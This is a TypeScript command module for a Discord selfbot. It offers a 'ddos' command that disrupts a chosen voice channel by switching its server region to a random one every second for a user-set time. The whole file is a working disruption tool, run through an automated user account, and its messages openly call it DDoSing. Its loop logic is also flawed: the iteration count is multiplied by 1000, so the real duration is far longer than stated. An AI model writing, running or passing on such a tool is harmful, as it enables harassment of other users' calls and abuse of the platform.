import { time } from 'discord.js';
import { VoiceBasedChannel } from 'discord.js-selfbot-v13';
import { MessageCommand } from '../../src/types/interactions';

export const messageCommand: MessageCommand = {
  async execute(_selfbot, selfbotUser, message, args: string[]) {
    const now = Math.floor(Date.now() / 1000);
    if (!message.inGuild()) {
      await message.edit({
        content:
          selfbotUser.lang === 'fr'
            ? `**Vous devez être sur un serveur pour executer cette commande!**\n-# ➜ *Suppression du message ${time(now + 16, 'R')}*`
            : `**You must be in a guild to execute this command!**\n-# ➜ *Deleting message ${time(now + 16, 'R')}*`,
      });
      return;
    }

    if (!args[0]) {
      await message.edit({
        content:
          selfbotUser.lang === 'fr'
            ? `**Vous devez spécifier un salon vocal à ddos! (*Exemple*: ${message.guild?.channels.cache.filter(c => c.type === 'GUILD_VOICE').first() ? '\`' + selfbotUser.prefix + `join ${message.guild?.channels.cache.filter(c => c.type === 'GUILD_VOICE').first()?.id}\`` : '\`join [salonVocal]\`'})**\n-# ➜ *Suppression du message ${time(now + 16, 'R')}*`
            : `**You must specify a voice channel to ddos! (*Exemple*: ${message.guild?.channels.cache.filter(c => c.type === 'GUILD_VOICE').first() ? '\`' + selfbotUser.prefix + `join ${message.guild?.channels.cache.filter(c => c.type === 'GUILD_VOICE').first()?.id}\`` : '\`join [voiceChannel]\`'})**\n-# ➜ *Deleting message ${time(now + 16, 'R')}*`,
      });
      return;
    }
    if (!args[1]) {
      await message.edit({
        content:
          selfbotUser.lang === 'fr'
            ? `**Vous devez spécifier un temps pour ddoser! (*Exemple*: ${selfbotUser.prefix}ddos <salonVocal> <temps>)\n-# ➜ *Suppression du message ${time(now + 16, 'R')}*`
            : `**You must specify a time to ddos! (*Exemple*: ${selfbotUser.prefix}ddos <voiceChannel> <time>)\n-# ➜ *Deleting message ${time(now + 16, 'R')}*`,
      });
    }
    const timel = parseInt(args[1]);
    if (isNaN(timel)) {
      await message.edit({
        content:
          selfbotUser.lang === 'fr'
            ? `**Le temps spécifié n'est pas un nombre valide!**\n-# ➜ *Suppression du message ${time(now + 16, 'R')}*`
            : `**The specified time is not a valid number!**\n-# ➜ *Deleting message ${time(now + 16, 'R')}*`,
      });
      return;
    }
    if (timel < 1 || timel > 30) {
      await message.edit({
        content:
          selfbotUser.lang === 'fr'
            ? `**Le temps spécifié n'est pas valide!**\n-# ➜ *Suppression du message ${time(now + 16, 'R')}*`
            : `**The specified time is not valid!**\n-# ➜ *Deleting message ${time(now + 16, 'R')}*`,
      });
      return;
    }
    const timef = timel * 1000;

    const channelId = args[0].replace('<#', '').replace('>', '');
    const channel = (await selfbotUser.channels.cache
      .get(channelId!)
      ?.fetch()
      ?.catch(async () => {
          await message.edit({
          content:
            selfbotUser.lang === "fr"
              ? `Vous ne possédez pas les permissions nécessaires pour voir le channel !`
              : `You do not have the necessary permissions to see the channel !`,
        });
      })) as VoiceBasedChannel

    const originalRegion = channel.rtcRegion;

    const regions = [
      "brazil",
      "hongkong",
      "india",
      "japan",
      "rotterdam",
      "russia",
      "singapore",
      "south-korea",
      "southafrica",
      "sydney",
      "us-central",
      "us-east",
      "us-south",
      "us-west",
    ];
     if(!channel.manageable) {
      await message.edit({
        content:
          selfbotUser.lang === "fr"
            ? `Vous ne possédez pas les permissions nécessaires pour DDOS un salon vocal !`
            : `You do not have the necessary permissions to DDOS a voice channel!`,
      });
      return;
    }


   await message.edit({
      content:
        selfbotUser.lang === "fr"
          ? `Vous etes en train de DDOS le salon vocal ${channel}...`
          : `You are currently DDOSing the voice channel ${channel}...`,
    });

    for (let i = 0; i < timef; i++) {
      try {
        const newRandom = Math.floor(Math.random() * regions.length);
        await channel.setRTCRegion(regions[newRandom]);
      } catch {}
      await new Promise((resolve) => setTimeout(resolve, 1000));
    }

    await channel.setRTCRegion(originalRegion);

    await message.edit({
      content:
        selfbotUser.lang === "fr"
          ? `Vous avez DDOS le salon vocal ${channel} avec succès !`
          : `You successfully DDOSed the voice channel ${channel}!`,
    });
  },
};
